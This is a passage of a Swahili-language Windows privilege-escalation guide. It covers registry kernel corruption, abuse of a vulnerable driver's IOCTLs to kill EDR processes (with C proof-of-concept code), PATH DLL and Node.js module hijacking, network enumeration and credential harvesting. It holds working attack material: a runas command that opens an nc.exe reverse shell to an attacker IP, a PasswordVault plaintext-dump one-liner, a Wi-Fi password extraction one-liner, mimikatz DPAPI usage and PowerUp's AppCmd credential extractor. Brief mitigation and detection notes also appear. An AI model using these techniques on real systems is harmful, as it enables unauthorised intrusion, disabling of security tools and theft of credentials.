- **Uharibifu wa kumbukumbu ya kernel**: destination ya scalar kama `&readValue` huchanganyikiwa kwa aina na kuwa `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kutegemea aina ya registry value.

Vidokezo vya vitendo vya exploitation:

- **Mitigation ya Windows 8+**: ikiwa query inagusa **untrusted hive** yenye `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, callers wa kernel hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili kudumisha uwezekano wa exploitation, tafuta **keys zinazoweza kuandikwa na mshambuliaji ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Uwekaji wa values kwenye trusted hive**: tumia NtObjectManager kuorodhesha descendants za `\Registry\Machine` zinazoweza kuandikwa, kisha endesha upya scan ukitumia token ya **low-integrity** iliyonakiliwa ili kupata keys zinazofikiwa kutoka kwenye mazingira ya sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 kwenye `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na unaweza kufunika kwa sehemu callback/function pointer iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ielekeze kwenye `UNICODE_STRING`. Ikiwa code kwanza inapakia `REG_DWORD` inayodhibitiwa na mshambulizi kwenye scalar ya stack kisha inatumia tena buffer hiyo hiyo kusoma string, mshambulizi hudhibiti `Length`/`MaximumLength` na huathiri kwa kiasi pointer ya `Buffer`, na hivyo kupata uandishi wa kernel unaodhibitiwa kwa sehemu.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza katika `EntryContext` kama ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` unaacha thamani **hasi** inayodhibitiwa na mshambulizi kwenye scalar iliyotumiwa tena, query inayofuata ya `REG_BINARY` hunakili baiti za mshambulizi moja kwa moja juu ya nafasi za stack zilizo karibu, ambayo mara nyingi ndiyo njia safi zaidi ya kufunika callback-pointer kikamilifu.

Mwelekeo muhimu wa kutafuta: **usomaji tofauti wa registry kwenye variable ileile ya stack bila kuiweka upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointers za `EntryContext` zilizotumiwa tena, na njia za code ambapo usomaji wa kwanza wa registry huamua kama usomaji wa pili utafanyika.

#### Kutumia vibaya kukosekana kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya third-party drivers zilizosainiwa huunda device object kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, secure DACL haitatekelezwa wakati kifaa kinafunguliwa kupitia path iliyo na component ya ziada, hivyo mtumiaji yeyote asiye na ruhusa anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji anapoweza kufungua kifaa, anaweza kutumia vibaya privileged IOCTLs zinazotolewa na driver kwa LPE na tampering. Uwezo ulioonekana katika matukio halisi:
- Kurudisha handles zenye ufikiaji kamili kwa processes zozote (wizi wa token / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write bila vizuizi (tampering nje ya mtandao, hila za boot-time persistence).
- Kusitisha processes zozote, ikiwemo Protected Process/Light (PP/PPL), na kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Hatua za kupunguza hatari kwa watengenezaji
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda object za device zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa mpigaji kwa operesheni zenye marupurupu. Fanya ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurejeshwa kwa handle.
- Weka vizuizi kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa ingizo) na uzingatie mifumo inayotumia broker badala ya marupurupu ya kernel ya moja kwa moja.

Mawazo ya kugundua kwa watetezi
- Fuatilia ufunguzi wa device names zinazotia shaka kutoka user mode (kwa mfano, \\ .\\amsdk*) na mfuatano maalum wa IOCTL unaoweza kuashiria matumizi mabaya.
- Tekeleza blocklist ya Microsoft ya viendeshi vilivyo hatarishi (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako mwenyewe.


## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folda iliyo kwenye PATH**, unaweza kuwa na uwezo wa kufanya DLL inayopakiwa na process itumike kwa njia isiyoidhinishwa na **kuongeza marupurupu**.<sup>[[2]](#references)</sup>

Kagua ruhusa za folda zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji nyara wa utatuzi wa module za Node.js / Electron kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapofanya import isiyo na njia kamili kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta packages kwa kupanda kwenye mti wa saraka na kukagua folda za `node_modules` katika kila saraka ya mzazi. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa drive, kwa hiyo programu iliyoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta hapa:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye upendeleo mdogo** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye upendeleo wa juu** utatue dependency inayokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato wa mwathiriwa, hivyo hii huwa **LPE** kila wakati lengo linapoendeshwa kama administrator, kupitia scheduled task iliyoinuliwa/service wrapper, au kama desktop app ya upendeleo wa juu inayojiwasha kiotomatiki.

Hali hii hutokea hasa wakati:

- dependency imetangazwa kwenye `optionalDependencies`<sup>[[22]](#references)</sup>
- third-party library inaweka `require("foo")` ndani ya `try/catch` na kuendelea ikiwa imeshindwa
- package imeondolewa kwenye production builds, imeachwa wakati wa packaging, au imeshindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya dependency tree badala ya kuwa kwenye msimbo mkuu wa programu

### Kutafuta malengo yaliyo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable inayolengwa (`node.exe`, EXE ya programu ya Electron, au mchakato wa wrapper)
- Chuja kwa `Path` `contains` `node_modules`
- Angazia `NAME NOT FOUND` na ufunguzi wa mwisho uliofanikiwa chini ya `C:\node_modules`

Miundo ya msimbo inayofaa kukaguliwa kwenye faili za `.asar` zilizofunguliwa au kwenye source code ya programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package linalokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Washa programu ya mwathiriwa. Ikiwa programu itajaribu `require("foo")` na moduli halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya moduli za hiari zinazokosekana katika matumizi halisi na zinazolingana na muundo huu ni `bluebird` na `utf-8-validate`, lakini **mbinu** ndiyo sehemu inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo mchakato wa Windows Node/Electron wenye mapendeleo utatatua.

### Mawazo ya ugunduzi na uimarishaji wa usalama

- Toa arifa mtumiaji anapounda `C:\node_modules` au kuandika faili/vifurushi vipya vya `.js` humo.
- Tafuta michakato yenye integrity ya juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha utegemezi wote wa runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine ili kupata mifumo ya `try { require("...") } catch {}` inayoficha hitilafu.
- Zima ukaguzi wa hiari ikiwa library inaruhusu (kwa mfano, baadhi ya usanidi wa `ws` unaweza kuepuka ukaguzi wa zamani wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### faili la hosts

Angalia kama kuna kompyuta nyingine zinazojulikana zilizowekwa kwa hardcode kwenye faili la hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Porti Zilizo Wazi

Angalia **huduma zilizowekewa vikwazo** kutoka nje

```bash
netstat -ano #Opened ports?
```

Kwa local listener, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Remote-control service inaweza kutoa ufikiaji kama mtumiaji wa desktop yake tu ikiwa masharti yake ya authentication na udhibiti wa command yanaruhusu. Custom TCP application inayoendeshwa chini ya akaunti yenye privileges za juu ni lengo tofauti la ukaguzi: listener na binary path ni vidokezo tu; kupata njia ya authenticated memory-corruption kunahitaji kuchanganua binary hiyo mahususi na input inayoweza kuifikia. Ikiwa port iliyo wazi inaonekana kuwa ya system process, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubainisha backend service; forwarding rule pekee haithibitishi kwamba destination inaweza kufikiwa au ina vulnerability.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(kuorodhesha sheria, kuunda sheria, kuzima, kuzima...)**

[Amri zaidi za kuhesabu mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` inaweza pia kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata root user, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, GUI itakuuliza ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa `root` wa Linux ndani ya WSL hakukupi moja kwa moja haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distro, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) kwa amri ambazo huenda zilirekodi vitambulisho; kupandisha haki bado kunahitaji akaunti halali yenye haki za juu zaidi na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` hutumika kwenye usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi distro kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hiyo tambua kwanza distro na njia halisi ya hifadhi. Epuka kuchapisha yaliyomo kwenye historia wakati wa uchunguzi wa kiotomatiki.

## Vitambulisho vya Windows

### Vitambulisho vya Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni ugunduzi wa nenosiri la maandishi wazi kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna nenosiri la maandishi wazi linalosomeka, hiyo ni kidokezo tu: [Sysinternals Autologon inaweza kuhifadhi nenosiri kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na usomaji wa kawaida wa registry hauwezi kuthibitisha kama secret hiyo ipo au inaweza kupatikana. Kagua ruhusa za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kufichuliwa kwa credentials.

### Kidhibiti cha credentials / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji za seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuingiza watumiaji kiotomatiki**. Mwanzoni, inaweza kusikika kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na vivinjari viziingize kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki. Hii inamaanisha kuwa **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault na kutumia credentials zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila mara.

Isipokuwa programu hizo ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali fulani. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault chaguomsingi ya hifadhi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` na seti ya credentials zilizotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kupitia [moduli ya Powershell ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na nywila za plaintext ndani ya Universal Windows Platform (UWP) `PasswordVault` (inayoonekana pia kama `Web Credentials` katika `vaultcmd`). Hifadhi hii hutenganishwa kwa kila session na inaweza kusimbuliwa kwa njia asilia bila haki za kiutawala au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session hai ya mtumiaji ili kumwaga na kusimbua papo hapo majina yote ya watumiaji na nywila zote za plaintext zilizohifadhiwa:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa mbinu ya usimbaji fiche wa data kwa kutumia ufunguo linganifu, inayotumika zaidi ndani ya mfumo wa uendeshaji wa Windows kusimba kwa njia linganifu funguo za faragha zisizolingana. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo ili kuchangia kwa kiasi kikubwa kwenye entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kwa kutumia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa kikoa za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa kwa njia fiche kwa kutumia DPAPI huhifadhiwa katika saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security_Identifier) cha mtumiaji. **Ufunguo wa DPAPI, uliohifadhiwa pamoja na ufunguo mkuu unaolinda funguo za faragha za mtumiaji katika faili hiyo hiyo**, kwa kawaida huwa na baiti 64 za data nasibu. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na hoja zinazofaa (`/pvk` au `/rpc`) ili ku-decrypt.

**Faili za credentials zinazolindwa na master password** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kusimbua.\
Unaweza **kutoa masterkeys nyingi za DPAPI** kutoka **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credentials za PowerShell

**Credentials za PowerShell** hutumika mara nyingi kwa **scripting** na kazi za automation, kama njia rahisi ya kuhifadhi credentials zilizosimbwa. Credentials hizi hulindwa kwa kutumia **DPAPI**, jambo ambalo kwa kawaida humaanisha kwamba zinaweza kusimbuliwa na mtumiaji yuleyule tu kwenye kompyuta ileile ambako ziliundwa.

Credential iliyohamishwa inaweza kuwa na jina lolote la faili au njia ya `.xml`. Ikiwa script au orodha ya faili inaelekeza kwenye moja, tafuta saraka halisi ya profile ya akaunti badala ya kudhani kuwa iko kwenye `C:\Users`: [Windows inaweza kuweka profiles mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` hufunga credential iliyosimbwa kwa mtumiaji na kompyuta iliyoi-export](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima iwe na ruhusa halali tofauti za kutumia service inayolengwa. Kagua njia na ACLs kwanza, bila kuonyesha thamani zilizosimbwa au zilizo wazi wakati wa ukaguzi wa kawaida.

Ili **kusimbua** credentials za PS kutoka kwenye faili iliyozihifadhi, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho vya Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory ukitumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na kwenye Documents za mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na sifa za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kama kidokezo cha credentials. Thamani iliyohifadhiwa si nywila ya DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji fiche ya faili na kama nywila maalum ya master ilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa utafutaji mpana.

**Remote Desktop Plus profile exports** zinaweza pia kupatikana katika saraka za mtumiaji au folda ya pamoja ya usimamizi. Export ya zamani ya `profiles.xml` ina maingizo ya `Data/Profile` yenye vipengele vya `ProfileName`, `Password`, na `Secure`. Chukulia kipengele cha password kisicho tupu kama kidokezo cha credentials, bila kukichapisha au kudhani kuwa kiko katika maandishi ya kawaida: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profile unaweza kuhusishwa na akaunti na kompyuta iliyoiunda, au kusanidiwa kwa masharti yasiyo makali sana. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye workstation za Windows **kuhifadhi nywila** na taarifa nyingine, bila kujua kuwa ni faili ya hifadhidata. Faili hii iko katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na inafaa kutafutwa na kuchunguzwa kila mara.

Watu wakati mwingine huhifadhi nywila na taarifa nyingine katika app za sticky-note. App ya Sticky Notes ya Microsoft iliyopakiwa kama package kwa kawaida huhifadhi notes katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; app za zamani au tofauti zinaweza kutumia hifadhi nyingine kwenye profile ya mtumiaji, ikijumuisha LevelDB. Tambua app iliyosakinishwa na muundo wa hifadhi kabla ya kuhitimisha kuwa hakuna notes kwa sababu faili ya SQLite haipo.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa notes zilizothibitishwa hivi karibuni. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya hifadhidata, na ujumuishe `plum.sqlite-shm` ikiwa inapatikana; index ya shared-memory inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya hifadhidata. Tazama [nyaraka za WAL za SQLite](https://www.sqlite.org/wal.html). Note yenye jina la akaunti au nywila ni kidokezo cha credentials tu: thibitisha akaunti, ruhusa ya kuifikia, na matumizi tena ya nywila kando. Rekodi iliyosimbwa ya password manager inahitaji pia ufunguo wake halisi wa kusimbua na ufafanuzi maalum wa app kabla ya kuthibitisha login yenye privilege ya juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha nywila kutoka kwa AppCmd.exe, unahitaji kuwa Administrator na kuiendesha katika kiwango cha High Integrity.**\
**AppCmd.exe** iko katika saraka ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, huenda baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Code hii ilinakiliwa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Visakinishi **huendeshwa kwa SYSTEM privileges**, vingi vinaweza kuathiriwa na **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Faili na Registry (Credentials)

### Artifacts za credentials za registry za zana za usaidizi

